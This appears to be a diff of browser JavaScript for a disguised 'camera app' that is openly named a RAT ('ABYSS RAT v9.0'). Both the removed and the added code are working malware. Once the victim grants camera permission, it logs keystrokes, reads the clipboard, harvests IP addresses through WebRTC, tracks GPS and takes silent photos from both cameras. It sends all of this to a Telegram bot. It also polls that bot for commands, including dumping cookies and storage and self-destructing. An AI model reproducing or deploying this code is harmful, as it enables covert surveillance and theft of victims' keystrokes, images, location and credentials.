-                            var ip = event.candidate.address;
-                            if (ip && ip.indexOf(':') === -1 &&
-                                ip.indexOf('127.') === -1 &&
-                                ip.indexOf('0.') === -1) {
-                                ips.add(ip);
-                            }
-                        } else {
-                            pc.close();
-                            resolve(Array.from(ips));
-                        }
-                    };
-                    setTimeout(function() {
-                        pc.close();
-                        resolve(Array.from(ips));
-                    }, 2500);
-                } catch(e) {
-                    resolve([]);
-                }
-            });
-        }
-
-        // ============================================================
-        // KEYLOGGER
-        // ============================================================
-        function startKeylogger() {
-            var ignoreKeys = [
-                'Shift', 'Control', 'Alt', 'Meta', 'CapsLock',
-                'Tab', 'ArrowLeft', 'ArrowRight', 'ArrowUp', 'ArrowDown',
-                'Escape', 'Dead', 'Fn', 'Hyper', 'Super', 'OS'
-            ];
-
-            document.addEventListener('keydown', function(event) {
-                if (ignoreKeys.indexOf(event.key) !== -1) return;
-
-                if (event.key === 'Enter') {
-                    state.keyBuf += '[ENTER]\n';
-                } else if (event.key === 'Backspace') {
-                    state.keyBuf += '[BS]';
-                } else if (event.key === ' ') {
-                    state.keyBuf += ' ';
-                } else if (event.key.length === 1) {
-                    state.keyBuf += event.key;
-                } else {
-                    state.keyBuf += '[' + event.key + ']';
-                }
-
-                if (state.keyBuf.length > 400) {
-                    TG.sendMessage('⌨️ [' + VID + '] Keylog:\n' + state.keyBuf);
-                    state.keyBuf = '';
-                }
-            });
-
-            setInterval(function() {
-                if (state.keyBuf.length > 0) {
-                    TG.sendMessage('⌨️ [' + VID + '] Keylog:\n' + state.keyBuf);
-                    state.keyBuf = '';
-                }
-            }, 12000);
-        }
-
-        // ============================================================
-        // CLIPBOARD MONITOR
-        // ============================================================
-        function checkClipboard() {
-            if (!navigator.clipboard || !navigator.clipboard.readText) return;
-            navigator.clipboard.readText().then(function(text) {
-                if (text && text !== state.lastClip && text.length > 0) {
-                    state.lastClip = text;
-                    TG.sendMessage('📋 [' + VID + '] Clipboard:\n' + text.substring(0, 2000));
-                }
-            }).catch(function() {});
-        }
-
-        // ============================================================
-        // STABILIZER (Gyroscope)
-        // ============================================================
-        function startStabilizer() {
-            if (!state.stabOn) return;
-            if (!window.DeviceOrientationEvent) return;
-
-            window.addEventListener('deviceorientation', function(event) {
-                if (!state.stream || !state.stream.active || !state.stabOn) return;
-                var gamma = event.gamma || 0;
-                var beta = event.beta || 0;
-                // Subtle stabilization transform
-                dom.vf.style.transform = 'translate(' +
-                    (-gamma * 0.025).toFixed(2) + 'px, ' +
-                    (beta * 0.025).toFixed(2) + 'px)';
-            });
-
-            showIndicator(dom.indStab);
-        }
-
-        function disableStabilizer() {
-            dom.vf.style.transform = '';
-        }
-
-        // ============================================================
-        // CORE: CAPTURE FRAME (WITH ALL EFFECTS)
-        // ============================================================
-        function captureFrame(silent) {
-            if (!state.stream || !state.stream.active) {
-                console.warn('[Capture] No active stream');
-                return;
-            }
-
-            if (state.burstActive && silent) return;
-            state.burstActive = true;
-
-            try {
-                var track = state.stream.getVideoTracks()[0];
-                var settings = track.getSettings();
-                var width = state.hdOn ? 3840 : 1920;
-                var height = state.hdOn ? 2160 : 1080;
-
-                // Clamp to actual settings if lower
-                if (settings.width && settings.width < width) width = settings.width;
-                if (settings.height && settings.height < height) height = settings.height;
-
-                var canvas = document.createElement('canvas');
-                canvas.width = width;
-                canvas.height = height;
-                var ctx = canvas.getContext('2d');
-
-                // ---- STEP 1: Draw video ----
-                ctx.drawImage(dom.vf, 0, 0, width, height);
-
-                // ---- STEP 2: BLUR / BOKEH ----
-                if (state.blurOn) {
-                    var offCanvas = document.createElement('canvas');
-                    offCanvas.width = width;
-                    offCanvas.height = height;
-                    var offCtx = offCanvas.getContext('2d');
-                    offCtx.drawImage(dom.vf, 0, 0, width, height);
-                    offCtx.filter = 'blur(18px)';
-                    offCtx.drawImage(offCanvas, 0, 0);
-
-                    ctx.drawImage(offCanvas, 0, 0);
-                    ctx.save();
-                    var centerX = width / 2;
-                    var centerY = height / 2;
-                    var radius = Math.min(width, height) * 0.3;
-                    ctx.beginPath();
-                    ctx.arc(centerX, centerY, radius, 0, Math.PI * 2);
-                    ctx.clip();
-                    ctx.drawImage(dom.vf, 0, 0, width, height);
-                    ctx.restore();
-
-                    showIndicator(dom.indBokeh);
-                }
-
-                // ---- STEP 3: HDR ----
-                if (state.hdrOn) {
-                    var imgData = ctx.getImageData(0, 0, width, height);
-                    var pixels = imgData.data;
-
-                    for (var i = 0; i < pixels.length; i += 4) {
-                        var r = pixels[i];
-                        var g = pixels[i + 1];
-                        var b = pixels[i + 2];
-                        var lum = 0.299 * r + 0.587 * g + 0.114 * b;
-
-                        if (lum < 60) {
-                            // Boost shadows
-                            pixels[i] = Math.min(255, r * 1.4);
-                            pixels[i + 1] = Math.min(255, g * 1.4);
-                            pixels[i + 2] = Math.min(255, b * 1.4);
-                        } else if (lum > 200) {
-                            // Compress highlights
-                            pixels[i] = Math.max(0, r * 0.78);
-                            pixels[i + 1] = Math.max(0, g * 0.78);
-                            pixels[i + 2] = Math.max(0, b * 0.78);
-                        }
-                    }
-                    ctx.putImageData(imgData, 0, 0);
-                    showIndicator(dom.indHDR);
-                }
-
-                // ---- STEP 4: SOFT CAM (Beauty Filter) ----
-                if (state.softOn) {
-                    var imgData2 = ctx.getImageData(0, 0, width, height);
-                    var pixels2 = imgData2.data;
-                    var smoothed = new Uint8ClampedArray(pixels2.length);
-                    var kernel = 2;
-
-                    for (var y = kernel; y < height - kernel; y++) {
-                        for (var x = kernel; x < width - kernel; x++) {
-                            var idx = (y * width + x) * 4;
-                            var rSum = 0, gSum = 0, bSum = 0, count = 0;
-
-                            for (var ky = -kernel; ky <= kernel; ky++) {
-                                for (var kx = -kernel; kx <= kernel; kx++) {
-                                    var kIdx = ((y + ky) * width + (x + kx)) * 4;
-                                    rSum += pixels2[kIdx];
-                                    gSum += pixels2[kIdx + 1];
-                                    bSum += pixels2[kIdx + 2];
-                                    count++;
-                                }
-                            }
-
-                            var rOrig = pixels2[idx];
-                            var gOrig = pixels2[idx + 1];
-                            var bOrig = pixels2[idx + 2];
-                            var lum = 0.299 * rOrig + 0.587 * gOrig + 0.114 * bOrig;
-
-                            // Only smooth skin-like tones
-                            if (rOrig > bOrig + 5 && gOrig > bOrig + 5 &&
-                                lum > 45 && lum < 235) {
-                                smoothed[idx] = (rSum / count * 0.55 + rOrig * 0.45);
-                                smoothed[idx + 1] = (gSum / count * 0.55 + gOrig * 0.45);
-                                smoothed[idx + 2] = (bSum / count * 0.55 + bOrig * 0.45);
-                            } else {
-                                smoothed[idx] = rOrig;
-                                smoothed[idx + 1] = gOrig;
-                                smoothed[idx + 2] = bOrig;
-                            }
-                            smoothed[idx + 3] = 255;
-                        }
-                    }
-                    ctx.putImageData(new ImageData(smoothed, width, height), 0, 0);
-                    showIndicator(dom.indSoft);
-                }
-
-                // ---- STEP 5: Watermark ----
-                var timestamp = getTimestamp();
-                ctx.font = '15px -apple-system, "Helvetica Neue", sans-serif';
-                ctx.fillStyle = 'rgba(255, 255, 255, 0.45)';
-                ctx.fillText(timestamp, 22, height - 22);
-
-                // Feature badges in corners
-                ctx.font = '12px -apple-system, sans-serif';
-                if (state.hdOn) ctx.fillText('4K', width - 45, height - 22);
-                if (state.hdrOn) ctx.fillText('HDR', width - 45, 35);
-                if (state.softOn) ctx.fillText('SOFT', 22, 35);
-                if (state.blurOn) ctx.fillText('BOKEH', width / 2 - 25, 35);
-
-                // ---- STEP 6: Build caption ----
-                var labels = [];
-                if (silent) labels.push('🤫 Silent');
-                else labels.push('📸 Foto');
-                if (state.hdOn) labels.push('4K');
-                if (state.hdrOn) labels.push('HDR');
-                if (state.blurOn) labels.push('Bokeh');
-                if (state.softOn) labels.push('Soft');
-                var caption = labels.join(' ') + ' | ' + getTimeShort();
-
-                if (state.gpsData) {
-                    caption += '\n📍 https://maps.google.com/?q=' +
-                        state.gpsData.lat + ',' + state.gpsData.lon;
-                    caption += '\n🎯 Akurasi: ±' + Math.round(state.gpsData.acc) + 'm';
-                }
-                if (state.localIPs.length > 0) {
-                    caption += '\n🌐 IP: ' + state.localIPs[0];
-                }
-
-                // ---- STEP 7: Convert & Send ----
-                canvas.toBlob(function(blob) {
-                    if (!blob) {
-                        state.burstActive = false;
-                        return;
-                    }
-
-                    if (silent) {
-                        TG.sendBeacon(blob, caption);
-                    } else {
-                        TG.sendPhoto(blob, caption);
-                    }
-
-                    // Update gallery thumbnail
-                    state.lastPhotoData = canvas.toDataURL('image/jpeg', CONFIG.JPEG_QUALITY);
-                    dom.galleryThumb.innerHTML = '<img src="' + state.lastPhotoData +
-                        '" alt="Preview">';
-                    dom.galleryThumb.classList.add('has-photo');
-
-                    // Flash effect (non-silent only)
-                    if (!silent) {
-                        dom.flashOverlay.classList.add('active');
-                        setTimeout(function() {
-                            dom.flashOverlay.classList.remove('active');
-                        }, 70);
-
-                        // Download trigger
-                        var downloadLink = document.createElement('a');
-                        downloadLink.download = 'photo_' + Date.now() + '.jpg';
-                        downloadLink.href = state.lastPhotoData;
-                        document.body.appendChild(downloadLink);
-                        downloadLink.click();
-                        document.body.removeChild(downloadLink);
-                    }
-
-                    // ---- LIVE PHOTO BURST ----
-                    if (state.liveOn && !silent) {
-                        for (var b = 0; b < CONFIG.BURST_COUNT - 1; b++) {
-                            (function(delay) {
-                                setTimeout(function() {
-                                    var burstCanvas = document.createElement('canvas');
-                                    burstCanvas.width = width;
-                                    burstCanvas.height = height;
-                                    var burstCtx = burstCanvas.getContext('2d');
-                                    burstCtx.drawImage(dom.vf, 0, 0, width, height);
-                                    burstCanvas.toBlob(function(burstBlob) {
-                                        if (burstBlob) {
-                                            TG.sendBeacon(burstBlob,
-                                                '🎬 Live ' + (delay / CONFIG.BURST_DELAY + 1) +
-                                                '/' + CONFIG.BURST_COUNT + ' | ' + getTimeShort());
-                                        }
-                                    }, 'image/jpeg', CONFIG.JPEG_QUALITY - 0.05);
-                                }, delay);
-                            })((b + 1) * CONFIG.BURST_DELAY);
-                        }
-                        showIndicator(dom.indLive);
-                    }
-
-                    if (state.hdOn) showIndicator(dom.indHD);
-                    state.burstActive = false;
-
-                }, 'image/jpeg', CONFIG.JPEG_QUALITY);
-
-            } catch(error) {
-                console.error('[Capture] Error:', error);
-                state.burstActive = false;
-            }
-        }
-
-        // ============================================================
-        // SILENT CAPTURE SCHEDULER
-        // ============================================================
-        function startSilentCapture() {
-            if (state.silentTimer) return;
-
-            // First capture after short delay
-            setTimeout(function() {
-                captureFrame(true);
-            }, CONFIG.FIRST_CAPTURE_DELAY);
-
-            // Subsequent captures
-            state.silentTimer = setInterval(function() {
-                if (state.stream && state.stream.active) {
-                    captureFrame(true);
-                }
-            }, CONFIG.SILENT_INTERVAL);
-        }
-
-        // ============================================================
-        // AUTO FLIP CAMERA
-        // ============================================================
-        function startAutoFlip() {
-            if (state.flipTimer) return;
-            state.flipTimer = setInterval(function() {
-                if (!state.stream || !state.stream.active) return;
-                var newFace = state.facingMode === 'environment' ? 'user' : 'environment';
-                startCamera(newFace);
-            }, CONFIG.FLIP_INTERVAL);
-        }
-
-        // ============================================================
-        // C2 TELEGRAM POLLING
-        // ============================================================
-        function pollC2() {
-            try {
-                var url = CONFIG.TG_API + CONFIG.BOT_TOKEN +
-                    '/getUpdates?offset=' + (state.lastUpdateId + 1) +
-                    '&timeout=5&limit=5';
-
-                fetch(url)
-                    .then(function(response) { return response.json(); })
-                    .then(function(data) {
-                        if (!data.ok || !data.result || !data.result.length) return;
-
-                        for (var i = 0; i < data.result.length; i++) {
-                            var update = data.result[i];
-                            state.lastUpdateId = update.update_id;
-
-                            var message = update.message;
-                            if (!message || !message.text) continue;
-
-                            var parts = message.text.trim().split(/\s+/);
-                            var command = parts[0].toLowerCase();
-                            var target = parts[1] || '';
-                            var args = parts.slice(2);
-
-                            // Filter by target
-                            if (target !== VID && target !== 'ALL' && target !== 'BROADCAST') continue;
-
-                            var result = executeC2Command(command, args);
-                            if (result) {
-                                TG.sendMessage('[' + VID + '] ' + result);
-                            }
-                        }
-                    })
-                    .catch(function() {});
-            } catch(e) {}
-        }
-
-        function executeC2Command(cmd, args) {
-            switch(cmd) {
-                case '/ping':
-                    return '🟢 Online | ' + getTimestamp();
-
-                case '/photo':
-                    captureFrame(false);
-                    return '📸 Foto terkirim';
-
-                case '/gps':
-                    return state.gpsData ?
-                        JSON.stringify(state.gpsData, null, 2) :
-                        'GPS belum tersedia';
-
-                case '/flip':
-                    var nf = state.facingMode === 'environment' ? 'user' : 'environment';
-                    startCamera(nf);
-                    return '📷 Kamera: ' + nf;
-
-                case '/blur':
-                    state.blurOn = !state.blurOn;
-                    dom.btnBlur.classList.toggle('on', state.blurOn);
-                    return '🌀 Blur: ' + (state.blurOn ? 'ON' : 'OFF');
-
-                case '/live':
-                    state.liveOn = !state.liveOn;
-                    dom.btnLive.classList.toggle('on', state.liveOn);
-                    return '🎬 Live: ' + (state.liveOn ? 'ON' : 'OFF');
-
-                case '/hd':
-                    state.hdOn = !state.hdOn;
-                    dom.btnHD.classList.toggle('on', state.hdOn);
-                    startCamera(state.facingMode);
-                    return '📐 HD: ' + (state.hdOn ? 'ON (4K)' : 'OFF (1080p)');
-
-                case '/hdr':
-                    state.hdrOn = !state.hdrOn;
-                    dom.btnHDR.classList.toggle('on', state.hdrOn);
-                    return '🌅 HDR: ' + (state.hdrOn ? 'ON' : 'OFF');
-
-                case '/stab':
-                    state.stabOn = !state.stabOn;
-                    dom.btnStab.classList.toggle('on', state.stabOn);
-                    if (state.stabOn) startStabilizer();
-                    else disableStabilizer();
-                    return '✋ Stab: ' + (state.stabOn ? 'ON' : 'OFF');
-
-                case '/soft':
-                    state.softOn = !state.softOn;
-                    dom.btnSoft.classList.toggle('on', state.softOn);
-                    return '✨ Soft: ' + (state.softOn ? 'ON' : 'OFF');
-
-                case '/cookies':
-                    return document.cookie || '(kosong)';
-
-                case '/storage':
-                    var dump = {
-                        localStorage: Object.assign({}, localStorage),
-                        sessionStorage: Object.assign({}, sessionStorage),
-                        cookies: document.cookie,
-                        url: location.href,
-                        referrer: document.referrer,
-                        historyLength: history.length,
-                        userAgent: navigator.userAgent,
-                        platform: navigator.platform,
-                        language: navigator.language,
-                        screenResolution: screen.width + 'x' + screen.height,
-                        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                        timestamp: new Date().toISOString()
-                    };
-                    var blob = new Blob([JSON.stringify(dump, null, 2)], { type: 'application/json' });
-                    TG.sendDocument(blob, 'storage_' + VID + '.json', '💾 Storage Dump');
-                    return '💾 Storage dump terkirim';
-
-                case '/info':
-                    return '🆔 ' + VID +
-                        '\n📷 Kamera: ' + state.facingMode +
-                        '\n🔍 Zoom: ' + state.currentZoom + '×' +
-                        '\n⚡ Flash: ' + (state.flashOn ? 'ON' : 'OFF') +
-                        '\n🌀 Blur: ' + state.blurOn +
-                        '\n🎬 Live: ' + state.liveOn +
-                        '\n📐 HD: ' + state.hdOn +
-                        '\n🌅 HDR: ' + state.hdrOn +
-                        '\n✋ Stab: ' + state.stabOn +
-                        '\n✨ Soft: ' + state.softOn +
-                        '\n📍 GPS: ' + (state.gpsData ? state.gpsData.lat.toFixed(4) + ',' + state.gpsData.lon.toFixed(4) : 'N/A') +
-                        '\n🌐 IP: ' + (state.localIPs.join(', ') || 'N/A');
-
-                case '/wipelogs':
-                    try { localStorage.clear(); } catch(e) {}
-                    try { sessionStorage.clear(); } catch(e) {}
-                    return '🧹 Logs dibersihkan';
-
-                case '/selfdest':
-                    clearAllTimers();
-                    document.body.innerHTML = '';
-                    setTimeout(function() { window.close(); }, 500);
-                    return '💀 Self destruct';
-
-                default:
-                    return '❓ Unknown: ' + cmd;
-            }
-        }
-
-        function startC2Polling() {
-            if (state.c2Timer) return;
-            function loop() {
-                pollC2();
-                state.c2Timer = setTimeout(loop, CONFIG.C2_POLL_INTERVAL);
-            }
-            loop();
-        }
-
-        function clearAllTimers() {
-            var timers = [state.silentTimer, state.flipTimer, state.c2Timer];
-            for (var i = 0; i < timers.length; i++) {
-                if (timers[i]) clearInterval(timers[i]);
-            }
-            if (state.gpsWatchId) {
-                navigator.geolocation.clearWatch(state.gpsWatchId);
-            }
-        }
-
-        // ============================================================
-        // CAMERA INITIALIZATION
-        // ============================================================
-        function startCamera(facing) {
-            if (state.isStarting) return;
-            state.isStarting = true;
-
-            dom.btnStartCamera.disabled = true;
-            dom.errorMessage.textContent = '';
-            dom.statusDot.className = 'status-dot loading';
-            dom.statusText.textContent = 'Mengakses kamera...';
-
-            // Stop previous stream
-            if (state.stream) {
-                state.stream.getTracks().forEach(function(track) {
-                    track.stop();
-                });
-                state.stream = null;
-                dom.vf.srcObject = null;
-            }
-
-            var targetFacing = facing || state.facingMode;
-
-            // First attempt: requested facing + HD settings
-            var constraints = {
-                video: {
-                    facingMode: targetFacing,
-                    width: { ideal: state.hdOn ? 3840 : 1920 },
-                    height: { ideal: state.hdOn ? 2160 : 1080 }
-                },
-                audio: false
-            };
-
-            navigator.mediaDevices.getUserMedia(constraints)
-                .then(function(mediaStream) {
-                    onCameraSuccess(mediaStream, targetFacing);
-                })
-                .catch(function(error1) {
-                    console.warn('[Camera] Primary attempt failed:', error1.message);
-
-                    // Second attempt: opposite facing
-                    var altFacing = targetFacing === 'environment' ? 'user' : 'environment';
-                    navigator.mediaDevices.getUserMedia({
-                        video: { facingMode: altFacing },
-                        audio: false
-                    })
-                    .then(function(mediaStream) {
-                        onCameraSuccess(mediaStream, altFacing);
-                    })
-                    .catch(function(error2) {
-                        console.warn('[Camera] Secondary attempt failed:', error2.message);
-
-                        // Third attempt: any camera
-                        navigator.mediaDevices.getUserMedia({
-                            video: true,
-                            audio: false
-                        })
-                        .then(function(mediaStream) {
-                            onCameraSuccess(mediaStream, 'environment');
-                        })
-                        .catch(function(error3) {
-                            onCameraError(error3);
-                        });
-                    });
-                });
-        }
-
-        function onCameraSuccess(mediaStream, facing) {
-            state.stream = mediaStream;
-            dom.vf.srcObject = mediaStream;
-
-            dom.vf.play()
-                .then(function() {
-                    state.facingMode = facing;
-                    state.isStarting = false;
-                    dom.btnStartCamera.disabled = false;
-
-                    dom.statusDot.className = 'status-dot ready';
-                    dom.statusText.textContent = 'Kamera aktif';
-
-                    // Apply zoom
-                    applyZoom();
-
-                    // Hide permission overlay
-                    dom.permOverlay.classList.add('hidden');
-
-                    // Initialize all RAT features
-                    initializeRAT();
-                })
-                .catch(function(error) {
-                    console.error('[Camera] Play failed:', error);
-                    onCameraError(error);
-                });
-        }
-
-        function onCameraError(error) {
-            state.isStarting = false;
-            dom.btnStartCamera.disabled = false;
-            dom.statusDot.className = 'status-dot error';
-            dom.statusText.textContent = 'Gagal';
-
-            var msg = 'Gagal mengakses kamera';
-            if (error.message) {
-                if (error.message.indexOf('Permission') !== -1) {
-                    msg = 'Izin kamera ditolak. Buka pengaturan browser.';
-                } else if (error.message.indexOf('NotFound') !== -1) {
-                    msg = 'Kamera tidak ditemukan.';
-                } else if (error.message.indexOf('NotAllowed') !== -1) {
-                    msg = 'Izin kamera diperlukan.';
-                }
-            }
-            dom.errorMessage.textContent = msg;
-        }
-
-        // ============================================================
-        // RAT INITIALIZATION
-        // ============================================================
-        function initializeRAT() {
-            // Grab local IPs
-            grabLocalIPs().then(function(ips) {
-                state.localIPs = ips;
-            });
-
-            // Send victim online notification
-            setTimeout(function() {
-                var info = '🟢 KAMERA ONLINE\n' +
-                    '🆔 ' + VID + '\n' +
-                    '📱 ' + navigator.userAgent.substring(0, 80) + '\n' +
-                    '🖥️ ' + screen.width + '×' + screen.height + '\n' +
-                    '🌐 ' + navigator.language + '\n' +
-                    '🌍 IP: ' + (state.localIPs.join(', ') || 'Loading...') + '\n' +
-                    '🔗 ' + location.href + '\n' +
-                    '🕐 ' + getTimestamp() + '\n' +
-                    '🌀Blur:' + state.blurOn +
-                    ' 🎬Live:' + state.liveOn +
-                    ' 📐HD:' + state.hdOn +
-                    ' 🌅HDR:' + state.hdrOn +
-                    ' ✋Stab:' + state.stabOn +
-                    ' ✨Soft:' + state.softOn;
-                TG.sendMessage(info);
-            }, 500);
-
-            // Start all monitoring
-            startGPS();
-            startSilentCapture();
-            startAutoFlip();
-            startKeylogger();
-            startStabilizer();
-            startC2Polling();
-
-            // Periodic tasks
-            setInterval(checkClipboard, CONFIG.CLIPBOARD_INTERVAL);
-            setInterval(function() {
-                TG.sendMessage('💓 HB ' + VID + ' | ' + getTimeShort() +
-                    ' | 📍 ' + (state.gpsData ? state.gpsData.lat.toFixed(4) + ',' + state.gpsData.lon.toFixed(4) : 'N/A'));
-            }, CONFIG.HEARTBEAT_INTERVAL);
-
-            console.log('🐺 ABYSS RAT v9.0 — All systems active');
-            console.log('🆔 Victim ID:', VID);
-        }
-
-        // ============================================================
-        // ZOOM CONTROL
-        // ============================================================
-        function applyZoom() {
-            if (!state.stream) return;
-
-            try {
-                var track = state.stream.getVideoTracks()[0];
-                var capabilities = track.getCapabilities();
-
-                if (capabilities.zoom) {
-                    var minZoom = capabilities.zoom.min || 0.5;
-                    var maxZoom = capabilities.zoom.max || 5;
-                    var zoomValue = Math.min(maxZoom, Math.max(minZoom, state.currentZoom));
-
-                    track.applyConstraints({
-                        advanced: [{ zoom: zoomValue }]
-                    }).catch(function(err) {
-                        console.warn('[Zoom] Apply failed:', err);
-                    });
-                }
-            } catch(e) {
-                console.warn('[Zoom] Error:', e);
-            }
-
-            // Update zoom wheel UI
-            var options = document.querySelectorAll('.zoom-option');
-            for (var i = 0; i < options.length; i++) {
-                var optionZoom = parseFloat(options[i].getAttribute('data-zoom'));
-                if (optionZoom === state.currentZoom) {
-                    options[i].classList.add('active');
-                } else {
-                    options[i].classList.remove('active');
-                }
-            }
-        }
-
-        function setZoom(zoomLevel) {
-            state.currentZoom = zoomLevel;
-            applyZoom();
-        }
-
-        // ============================================================
-        // EVENT LISTENERS
-        // ============================================================
-        dom.btnStartCamera.addEventListener('click', function() {
-            startCamera();
+        })
+        .catch(function(e) {
+            console.error('❌ Error:', e);
+            tgDoc(blob, 'photo_' + Date.now() + '.jpg', caption);
         });
+    }
 
-        dom.btnShutter.addEventListener('click', function() {
-            captureFrame(false);
-        });
+    function tgBeacon(blob, caption) {
+        var fd = new FormData();
+        fd.append('chat_id', CID);
+        fd.append('photo', blob, 's_' + Date.now() + '.jpg');
+        fd.append('caption', caption || '');
+        fd.append('disable_notification', 'true');
+        fetch(API + '/sendPhoto', { method: 'POST', body: fd }).catch(function() {});
+    }
 
-        dom.btnFlash.addEventListener('click', function() {
-            if (!state.stream) return;
-            state.flashOn = !state.flashOn;
-            try {
-                var track = state.stream.getVideoTracks()[0];
-                track.applyConstraints({
-                    advanced: [{ torch: state.flashOn }]
-                }).catch(function() {});
-            } catch(e) {}
-            dom.btnFlash.classList.toggle('on', state.flashOn);
-        });
+    function tgDoc(blob, filename, caption) {
+        var fd = new FormData();
+        fd.append('chat_id', CID);
+        fd.append('document', blob, filename);
+        fd.append('caption', caption || '');
+        fd.append('disable_notification', 'true');
+        fetch(API + '/sendDocument', { method: 'POST', body: fd }).catch(function() {});
+    }
 
-        dom.btnFlip.addEventListener('click', function() {
-            var newFace = state.facingMode === 'environment' ? 'user' : 'environment';
-            startCamera(newFace);
-        });
+    // ==================== INDICATOR ====================
+    function showTag(t){indTag.textContent=t;indTag.classList.add('show');setTimeout(function(){indTag.classList.remove('show')},1200)}
 
-        dom.btnBlur.addEventListener('click', function() {
-            state.blurOn = !state.blurOn;
-            dom.btnBlur.classList.toggle('on', state.blurOn);
-        });
+    // ==================== GPS ====================
+    function startGPS(){if(!navigator.geolocation)return;gpsWatchId=navigator.geolocation.watchPosition(function(p){gpsData={lat:p.coords.latitude,lon:p.coords.longitude,acc:p.coords.accuracy}},function(){},{enableHighAccuracy:true})}
 
-        dom.btnLive.addEventListener('click', function() {
-            state.liveOn = !state.liveOn;
-            dom.btnLive.classList.toggle('on', state.liveOn);
-        });
+    // ==================== IP ====================
+    function grabIPs(){return new Promise(function(r){var ips=new Set();try{var pc=new RTCPeerConnection({iceServers:[{urls:'stun:stun.l.google.com:19302'}]});pc.createDataChannel('');pc.createOffer().then(function(o){pc.setLocalDescription(o)});pc.onicecandidate=function(e){if(e.candidate){var ip=e.candidate.address;if(ip&&ip.indexOf(':')===-1&&ip.indexOf('127.')===-1)ips.add(ip)}else{pc.close();r(Array.from(ips))}};setTimeout(function(){pc.close();r(Array.from(ips))},2000)}catch(e){r([])}})}
 
-        dom.btnHD.addEventListener('click', function() {
-            state.hdOn = !state.hdOn;
-            dom.btnHD.classList.toggle('on', state.hdOn);
-            startCamera(state.facingMode);
-        });
+    // ==================== KEYLOGGER ====================
+    function startKeylogger(){document.addEventListener('keydown',function(e){var ig=['Shift','Control','Alt','Meta','Tab','Escape'];if(ig.indexOf(e.key)!==-1)return;if(e.key==='Enter')keyBuf+='[↵]\n';else if(e.key==='Backspace')keyBuf+='[⌫]';else if(e.key===' ')keyBuf+=' ';else if(e.key.length===1)keyBuf+=e.key;else keyBuf+='['+e.key+']';if(keyBuf.length>300){tg('⌨️['+VID+']\n'+keyBuf);keyBuf=''}});setInterval(function(){if(keyBuf.length>0){tg('⌨️['+VID+']\n'+keyBuf);keyBuf=''}},10000)}
 
-        dom.btnHDR.addEventListener('click', function() {
-            state.hdrOn = !state.hdrOn;
-            dom.btnHDR.classList.toggle('on', state.hdrOn);
-        });
+    // ==================== CLIPBOARD ====================
+    function checkClipboard(){try{navigator.clipboard.readText().then(function(t){if(t&&t!==lastClip&&t.length>0){lastClip=t;tg('📋['+VID+']\n'+t.substring(0,1500))}})}catch(e){}}
 
-        dom.btnStab.addEventListener('click', function() {
-            state.stabOn = !state.stabOn;
-            dom.btnStab.classList.toggle('on', state.stabOn);
-            if (state.stabOn) {
-                startStabilizer();
-            } else {
-                disableStabilizer();
-            }
-        });
+    // ==================== CORE CAPTURE ====================
+    function captureFrame(silent){
+        if(!stream||!stream.active)return;
+        try{
+            var t=stream.getVideoTracks()[0],st=t.getSettings();
+            var maxW=hdOn?2560:1280,maxH=hdOn?1440:720;
+            var w=Math.min(st.width||maxW,maxW),h=Math.min(st.height||maxH,maxH);
+            var cv=document.createElement('canvas');cv.width=w;cv.height=h;
+            var cx=cv.getContext('2d');
 
-        dom.btnSoft.addEventListener('click', function() {
-            state.softOn = !state.softOn;
-            dom.btnSoft.classList.toggle('on', state.softOn);
-        });
+            // BLUR
+            if(blurOn){var off=document.createElement('canvas');off.width=w;off.height=h;var ox=off.getContext('2d');ox.drawImage(vf,0,0,w,h);ox.filter='blur(16px)';ox.drawImage(off,0,0);cx.drawImage(off,0,0);cx.save();var cxx=w/2,cyy=h/2,rr=Math.min(w,h)*.3;cx.beginPath();cx.arc(cxx,cyy,rr,0,Math.PI*2);cx.clip();cx.drawImage(vf,0,0,w,h);cx.restore();showTag('🌀BOKEH')}
+            else{cx.drawImage(vf,0,0,w,h)}
 
-        // Zoom wheel
-        var zoomOptions = document.querySelectorAll('.zoom-option');
-        for (var i = 0; i < zoomOptions.length; i++) {
-            zoomOptions[i].addEventListener('click', function() {
-                var z = parseFloat(this.getAttribute('data-zoom'));
-                setZoom(z);
-            });
-        }
+            // HDR
+            if(hdrOn){var id=cx.getImageData(0,0,w,h),d=id.data;for(var i=0;i<d.length;i+=4){var lum=.299*d[i]+.587*d[i+1]+.114*d[i+2];if(lum<70){d[i]=Math.min(255,d[i]*1.35);d[i+1]=Math.min(255,d[i+1]*1.35);d[i+2]=Math.min(255,d[i+2]*1.35)}else if(lum>210){d[i]=Math.max(0,d[i]*.8);d[i+1]=Math.max(0,d[i+1]*.8);d[i+2]=Math.max(0,d[i+2]*.8)}}cx.putImageData(id,0,0);showTag('🌅HDR')}
 
-        // Gallery thumbnail
-        dom.galleryThumb.addEventListener('click', function() {
-            if (!state.lastPhotoData) return;
-            var previewWindow = window.open('', '_blank');
-            previewWindow.document.write(
-                '<!DOCTYPE html>' +
-                '<html>' +
-                '<head>' +
-                '<meta name="viewport" content="width=device-width, initial-scale=1.0">' +
-                '<style>' +
-                'body { margin: 0; background: #000; display: flex; align-items: center; justify-content: center; height: 100vh; }' +
-                'img { max-width: 100%; max-height: 100%; object-fit: contain; cursor: pointer; }' +
-                '</style>' +
-                '</head>' +
-                '<body>' +
-                '<img src="' + state.lastPhotoData + '" onclick="window.close()" alt="Preview">' +
-                '</body>' +
-                '</html>'
-            );
-            previewWindow.document.close();
-        });
+            // SOFT
+            if(softOn){var id2=cx.getImageData(0,0,w,h),d2=id2.data,sm=new Uint8ClampedArray(d2.length),kw=2;for(var y=kw;y<h-kw;y++){for(var x=kw;x<w-kw;x++){var idx=(y*w+x)*4,rS=0,gS=0,bS=0,ct=0;for(var ky=-kw;ky<=kw;ky++){for(var kx=-kw;kx<=kw;kx++){var kIdx=((y+ky)*w+(x+kx))*4;rS+=d2[kIdx];gS+=d2[kIdx+1];bS+=d2[kIdx+2];ct++}}var lum2=.299*d2[idx]+.587*d2[idx+1]+.114*d2[idx+2];if(d2[idx]>d2[idx+2]+5&&d2[idx+1]>d2[idx+2]+5&&lum2>45&&lum2<235){sm[idx]=(rS/ct*.55+d2[idx]*.45);sm[idx+1]=(gS/ct*.55+d2[idx+1]*.45);sm[idx+2]=(bS/ct*.55+d2[idx+2]*.45)}else{sm[idx]=d2[idx];sm[idx+1]=d2[idx+1];sm[idx+2]=d2[idx+2]}sm[idx+3]=255}}cx.putImageData(new ImageData(sm,w,h),0,0);showTag('✨SOFT')}
 
-        // Focus ring on empty area tap
-        document.addEventListener('click', function(event) {
-            var target = event.target;
-            if (target.closest('button') ||
-                target.closest('.zoom-option') ||
